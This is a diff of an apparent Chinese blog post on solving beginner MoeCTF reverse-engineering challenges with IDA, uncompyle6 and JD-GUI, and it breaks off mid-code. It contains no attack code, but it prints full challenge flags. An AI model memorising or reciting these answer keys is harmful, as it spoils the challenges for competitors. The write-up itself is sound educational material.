@@ -27,18 +27,36 @@
  </a>
 </h3><p>这道题&hellip; 就是教你怎么用<code>IDA</code>的..</p>
 <p>在网上找来的<code>IDA</code>资源, ,然后安装,打开,发现了这么几句:</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
-call puts
-mov dword ptr [esp+17h], 63656F6Dh
-mov dword ptr [esp+1Bh], 447B6674h
-mov dword ptr [esp+1Fh], 6F595F30h
-mov dword ptr [esp+23h], 326B5F75h
-mov dword ptr [esp+27h], 495F776Fh
-mov dword ptr [esp+2Bh], 7D3F4144h
-mov byte ptr [esp+2Fh], 0
-lea eax, [esp+30h+var_19]
-mov [esp], eax ; char *
-call sub_401500</code></pre><p>然后找了个16进制转ASCII的网站, 复制第三行的 <code>63 65 6F 6D</code> 进去, 发现解出来是 <code>ceom</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">aWelcomeToTheMo</span> <span class="p">;</span> <span class="s2">&#34;Welcome to the MoeCTF!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">call</span> <span class="n">puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">17</span><span class="n">h</span><span class="p">],</span> <span class="mi">63656</span><span class="n">F6Dh</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Bh</span><span class="p">],</span> <span class="mi">447</span><span class="n">B6674h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Fh</span><span class="p">],</span> <span class="mi">6</span><span class="n">F595F30h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">23</span><span class="n">h</span><span class="p">],</span> <span class="mi">326</span><span class="n">B5F75h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">27</span><span class="n">h</span><span class="p">],</span> <span class="mi">495</span><span class="n">F776Fh</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">2</span><span class="n">Bh</span><span class="p">],</span> <span class="mi">7</span><span class="n">D3F4144h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">2</span><span class="n">Fh</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">lea</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">var_19</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">char</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">call</span> <span class="n">sub_401500</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后找了个16进制转ASCII的网站, 复制第三行的 <code>63 65 6F 6D</code> 进去, 发现解出来是 <code>ceom</code></p>
 <p>啊嘞?反过来不就是 <code>moec</code> 么?</p>
 <p>按照这个思路, 挨个复制然后反过来输出, 就把 <code>flag</code> 找到了.</p>
 <h3 class="heading-element" id="moe-re"><span>Moe RE</span>
@@ -47,7 +65,36 @@ call sub_401500</code></pre><p>然后找了个16进制转ASCII的网站, 复制�
  </a>
 </h3><p>这道题我本来是第二题做的,, 后来发现竟然比我想象中的难&hellip;</p>
 <p>下载了<code>re</code>, 发现打不开, 就扔进<code>Windows</code>的<code>Linux</code>子系统里, 发现依旧打不开, 啊嘞? 什么情况? 不行我重启到<code>Arch Linux</code>试试? 算了我懒得费那个神&hellip; 直接扔进IDA, 发现汇编读不懂, 就按了下F5, 得到了以下伪代码:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span> <span class="c1">// 注释是后来自己添加的
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
@@ -71,8 +118,31 @@ call sub_401500</code></pre><p>然后找了个16进制转ASCII的网站, 复制�
 </span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span> <span class="n">__stack_chk_guard</span> <span class="o">==</span> <span class="n">v10</span> <span class="p">)</span>
 </span></span><span class="line"><span class="cl"> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>小小的研究一下源代码, 发现是个简单的算法, 具体如代码注释里写的那样, 于是写一个小程序破解之:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>小小的研究一下源代码, 发现是个简单的算法, 具体如代码注释里写的那样, 于是写一个小程序破解之:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstdio&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
@@ -88,16 +158,48 @@ call sub_401500</code></pre><p>然后找了个16进制转ASCII的网站, 复制�
 </span></span><span class="line"><span class="cl"> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="n">i</span><span class="o">++</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>差不多就是把题目反着写了一遍, 然后运行, 把题目给的数字串输入进去,回车出<code>flag</code>.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>差不多就是把题目反着写了一遍, 然后运行, 把题目给的数字串输入进去,回车出<code>flag</code>.</p>
 <h3 class="heading-element" id="pyc"><span>.pyc</span>
  <a href="#pyc" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>啊嘞? <code>Python</code>难道不是解释型语言么??? ( 我见识太少了 [ 抱头痛哭 ]</p>
 <p>按照Bing上搜到的说法, 我就先装了个反编译<code>tool</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ pip install uncompyle</span></span></code></pre></div><p>然后&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ uncompyle6 ./test.cpython-37.pyc &gt; ./test.cpython-37.py</span></span></code></pre></div><p>再然后就得到了以下代码, 官方说<code>uncompyle</code>只支持<code>Python2.x</code>, 所以搞出来的有bug, 不过差不多能理解:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.4.0</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ pip install uncompyle</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ uncompyle6 ./test.cpython-37.pyc &gt; ./test.cpython-37.py</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再然后就得到了以下代码, 官方说<code>uncompyle</code>只支持<code>Python2.x</code>, 所以搞出来的有bug, 不过差不多能理解:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.4.0</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 3.7 (3394)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul 8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)]</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: test.py</span>
@@ -108,25 +210,59 @@ call sub_401500</code></pre><p>然后找了个16进制转ASCII的网站, 复制�
 </span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="nb">print</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">b2a_hex</span><span class="p">(</span><span class="n">b32encode</span><span class="p">(</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;4e5658574b5933554d5a3558413452544d4d59473234444a4e525557345a5a4e4b4234574758334447525846364d44514f51595732324c324d55575647344254474e5348323d3d3d&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl"> <span class="n">y</span><span class="p">(</span><span class="s1">&#39;congrats&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># okay decompiling C:\\users\rever\Downloads\test.cpython-37.pyc</span></span></span></code></pre></div><p>看见了一大串hex, 于是找了个网站转换之:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">NVXWKY3UMZ5XA4RTMMYG24DJNRUW4ZZNKB4WGX3DGRXF6MDQOQYW22L2MUWVG4BTGNSH2</span><span class="o">===</span></span></span></code></pre></div><p>根据源代码, 这是一份<code>base32</code>加密的玩意儿, 于是再找个网站解密得到<code>flag</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">moectf<span class="o">{</span>pr3c0mpiling-Pyc_c4n_0pt1mize-Sp33d<span class="o">}</span></span></span></code></pre></div><h3 class="heading-element" id="easy-shell"><span>Easy Shell</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># okay decompiling C:\\users\rever\Downloads\test.cpython-37.pyc</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>看见了一大串hex, 于是找了个网站转换之:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">NVXWKY3UMZ5XA4RTMMYG24DJNRUW4ZZNKB4WGX3DGRXF6MDQOQYW22L2MUWVG4BTGNSH2</span><span class="o">===</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据源代码, 这是一份<code>base32</code>加密的玩意儿, 于是再找个网站解密得到<code>flag</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">moectf<span class="o">{</span>pr3c0mpiling-Pyc_c4n_0pt1mize-Sp33d<span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 class="heading-element" id="easy-shell"><span>Easy Shell</span>
  <a href="#easy-shell" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这个我说什么好咧.. 就是百度找了个<code>upx tool</code>,然后把题上给的<code>exe</code>扔了进去, 再把吐出来的东西扔进<code>IDA</code>&hellip; 发现这么一段:</p>
-<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
-call puts
-mov dword ptr [esp+11h], 63656F6Dh
-mov dword ptr [esp+15h], 757B6674h
-mov dword ptr [esp+19h], 315F7870h
-mov dword ptr [esp+1Dh], 5F615F73h
-mov dword ptr [esp+21h], 646E314Bh
-mov dword ptr [esp+25h], 5F46305Fh
-mov dword ptr [esp+29h], 31326873h
-mov word ptr [esp+2Dh], 7D4Ch
-mov byte ptr [esp+2Fh], 0
-lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我就明白了, 和<code>IntroducingRE</code>相同解法, 得到<code>flag</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">aWelcomeToTheMo</span> <span class="p">;</span> <span class="s2">&#34;Welcome to the MoeCTF!&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">call</span> <span class="n">puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">11</span><span class="n">h</span><span class="p">],</span> <span class="mi">63656</span><span class="n">F6Dh</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">15</span><span class="n">h</span><span class="p">],</span> <span class="mi">757</span><span class="n">B6674h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">19</span><span class="n">h</span><span class="p">],</span> <span class="mi">315</span><span class="n">F7870h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Dh</span><span class="p">],</span> <span class="mi">5</span><span class="n">F615F73h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">21</span><span class="n">h</span><span class="p">],</span> <span class="mf">646E314</span><span class="n">Bh</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">25</span><span class="n">h</span><span class="p">],</span> <span class="mi">5</span><span class="n">F46305Fh</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">29</span><span class="n">h</span><span class="p">],</span> <span class="mi">31326873</span><span class="n">h</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">word</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">2</span><span class="n">Dh</span><span class="p">],</span> <span class="mi">7</span><span class="n">D4Ch</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">2</span><span class="n">Fh</span><span class="p">],</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">lea</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">30</span><span class="n">h</span><span class="o">+</span><span class="n">var_1F</span><span class="p">]</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到那个<code>63 65 6F 6D</code>我就明白了, 和<code>IntroducingRE</code>相同解法, 得到<code>flag</code>.</p>
 <h3 class="heading-element" id="easy-debugger"><span>Easy Debugger</span>
  <a href="#easy-debugger" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -139,7 +275,36 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </h3><p>从这题开始, 我知道了, 所有写着Easy的题, 都是骗人的🙂一点都不Easy&hellip; 可能我菜是很大的原因吧……</p>
 <p>还是相同的套路, 下载后扔进<code>IDA</code>, 然后看见了浩如烟海的函数&hellip; ( woc要不要这么刺激</p>
 <p>费尽千辛万苦找到了main_main函数, 打开后看了眼汇编发现头疼, 果断F5:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main_main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main_main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"> <span class="cm">/* 一大堆变量声明,节省篇幅就不看了 */</span>
@@ -163,14 +328,81 @@ lea eax, [esp+30h+var_1F]</code></pre><p>看到那个<code>63 65 6F 6D</code>我
 </span></span><span class="line"><span class="cl"> <span class="n">os_Stdout</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"> <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="cm">/* 后面一个else一个return,都不是重点 */</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>一不小心看到了代码里有一个<code>Fscanln</code>, 想着这肯定是读取输入, 得了, 分析一下, 不用再找<code>flag</code>了, 然后发现<code>if</code>语句里比较了<code>v19</code>和<code>1107LL</code>, 果断打开题目给的<code>exe</code>, 然后输入<code>1107</code>, 成功拿到<code>flag</code>! <code>flag: moectf{G0_1Anguage_1s_1nT3r3st1ng}</code></p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>一不小心看到了代码里有一个<code>Fscanln</code>, 想着这肯定是读取输入, 得了, 分析一下, 不用再找<code>flag</code>了, 然后发现<code>if</code>语句里比较了<code>v19</code>和<code>1107LL</code>, 果断打开题目给的<code>exe</code>, 然后输入<code>1107</code>, 成功拿到<code>flag</code>! <code>flag: moectf{G0_1Anguage_1s_1nT3r3st1ng}</code></p>
 <h3 class="heading-element" id="java-re"><span>Java RE</span>
  <a href="#java-re" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>给大佬递咖啡~ 诶,劳资咖啡咧, 好像丢了…</p>
 <p>这道题, 用JD-GUI反编译了一下, 得到了一份狠长的代码:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">qqq</span><span class="p">;</span><span class="w">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
